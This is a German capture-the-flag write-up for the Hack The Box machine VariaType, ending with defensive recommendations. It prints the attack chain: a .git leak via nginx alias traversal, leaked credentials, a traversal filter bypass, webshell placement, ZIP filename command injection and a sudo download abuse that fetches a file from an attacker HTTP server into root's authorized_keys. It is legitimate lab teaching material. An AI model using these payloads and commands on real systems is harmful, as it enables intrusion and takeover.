# Hack The Box: VariaType Writeup

> Öffentliches Writeup für GitHub. Flags sind absichtlich nicht enthalten.

## Überblick

VariaType ist eine Linux-Maschine mit mehreren Webanwendungen rund um Font-Verarbeitung. Die Kette beginnt mit VHost-Enumeration und einem `.git`-Leak über Nginx-Alias-Traversal. Danach führen Path Traversal, eine FontTools/varLib-Arbitrary-Write-Schwachstelle und eine FontForge-ZIP-Filename-Command-Injection zu Codeausführung als `www-data` und später als `steve`. Die Root-Eskalation nutzt eine unsichere Verwendung von `setuptools.package_index.PackageIndex().download()` in einem per sudo erlaubten Validator-Script.

## Recon

Initialer Scan:

```bash
nmap -Pn -sC -sV -oN nmap-initial.txt 10.129.244.202
nmap -Pn -p- --min-rate 5000 -oN nmap-allports.txt 10.129.244.202
```

Interessante Dienste:

```text
22/tcp  SSH
80/tcp  HTTP
```

VHost-Enumeration ergab unter anderem:

```text
variatype.htb
portal.variatype.htb
```

## Source Leak über Nginx Alias Traversal

Auf `portal.variatype.htb` war ein `.git`-Verzeichnis über eine Alias-Traversal-Schwachstelle erreichbar:

```text
/files/%2e%2e/.git/
```

Dump:

```bash
python3 -m git_dumper 'http://portal.variatype.htb/files/%2e%2e/.git/' portal-gitdump
```

Anschließend wurden Commits, Quellcode und Konfigurationen durchsucht:

```bash
cd portal-gitdump
git log --oneline --decorate --all
grep -RInE 'pass|secret|token|key|user|hash|admin|ssh' . --exclude-dir=.git
```

Der Git-Dump enthielt Portal-Zugangsdaten:

```text
gitbot:G1tB0t_Acc3ss_2025!
```

## Portal-Zugriff und LFI

Mit den Credentials war der Login im Portal möglich. Dort existierte ein Download-Endpoint mit schwacher Traversal-Filterung.

Bypass-Idee:

```text
..././
```

Damit konnten Dateien außerhalb des erwarteten Download-Verzeichnisses gelesen werden.

## Foothold: FontTools / varLib Arbitrary Write

Die Hauptanwendung nutzte FontTools/varLib. Über eine manipulierte Designspace-Konfiguration konnte der Ausgabepfad einer erzeugten Variable-Font-Datei beeinflusst werden.

Ziel war ein schreibbarer, über das Portal erreichbarer Pfad:

```text
/var/www/portal.variatype.htb/public/files/<shell>.php
```

Damit wurde eine PHP-Webshell platziert und Codeausführung als Webserver-Benutzer erreicht:

```text
uid=www-data
```

## Lateral Movement zu steve

Auf dem System lag ein Backup-Script:

```text
/opt/process_client_submissions.bak
```

Dieses verarbeitete hochgeladene ZIP-Dateien über FontForge. Dabei konnte eine Filename-/Command-Injection in ZIP-Inhalten ausgenutzt werden.

Ablauf:

1. Exploit-ZIP mit präpariertem Dateinamen erzeugen
2. ZIP in den Portal-Files-Pfad legen
3. Pipeline verarbeitet ZIP automatisch
4. Command läuft im Kontext von `steve`
5. SSH-Key für `steve` in `authorized_keys` schreiben

Danach war SSH-Zugriff als `steve` möglich:

```bash
ssh -i htb_key steve@10.129.244.202
```

## User Flag

Als `steve`:

```bash
cat /home/steve/user.txt
```

Flag wird im öffentlichen Writeup nicht veröffentlicht.

## Privilege Escalation zu root

`sudo -l` als `steve` zeigte eine erlaubte Python-Ausführung:

```text
sudo /usr/bin/python3 /opt/font-tools/install_validator.py *
```

Das Script verwendete `setuptools.package_index.PackageIndex().download()` unsicher. Über eine speziell gebaute URL mit encoded absolute path ließ sich ein Zielpfad für den Download beeinflussen.

Ziel:

```text
/root/.ssh/authorized_keys
```

Payload-Pfad:

```text
/%2Froot%2F.ssh%2Fauthorized_keys
```

Ablauf:

```bash
# lokal authorized_keys über HTTP bereitstellen
python3 -m http.server 8888

# auf dem Target den Validator per sudo mit präparierter URL aufrufen
sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://<HTB_TUN_IP>:8888/%2Froot%2F.ssh%2Fauthorized_keys'
```

Danach war SSH als root möglich:

```bash
ssh -i htb_key root@10.129.244.202
```

Root-Flag:

```bash
cat /root/root.txt
```

Flag wird im öffentlichen Writeup nicht veröffentlicht.

## Kill Chain

```text
VHost discovery
    -> portal.variatype.htb
    -> .git leak via /files/%2e%2e/.git/
    -> Portal credentials
    -> Path traversal / LFI
    -> FontTools varLib arbitrary write
    -> PHP webshell as www-data
    -> FontForge ZIP filename command injection
    -> Code execution as steve
    -> sudo install_validator.py
    -> setuptools PackageIndex download path abuse
    -> Write /root/.ssh/authorized_keys
    -> SSH as root
```

## Takeaways

- Nginx-Alias-Konfigurationen sind anfällig für Traversal-Fehler, wenn Pfade nicht sauber normalisiert werden.
- `.git`-Leaks können direkt zu Credentials und interner Logik führen.
- Dateiverarbeitungs-Pipelines für Fonts/ZIPs sind gefährliche Angriffsflächen.
- Ausgabepfade in Konvertierungstools müssen strikt kontrolliert werden.
- `sudo` auf Python-Scripts ist riskant, wenn externe URLs oder Pfade verarbeitet werden.

## Empfehlungen

- `.git`-Verzeichnisse niemals ausliefern.
- Download-Endpoints mit Allowlist und sicheren Pfad-Joins implementieren.
- Upload- und Font-Processing-Jobs in isolierten Sandboxes ausführen.
- Keine nutzerkontrollierten Pfade an Tools wie FontTools, FontForge oder PackageIndex weitergeben.
- `sudo`-Regeln so eng wie möglich halten und Wildcards vermeiden.
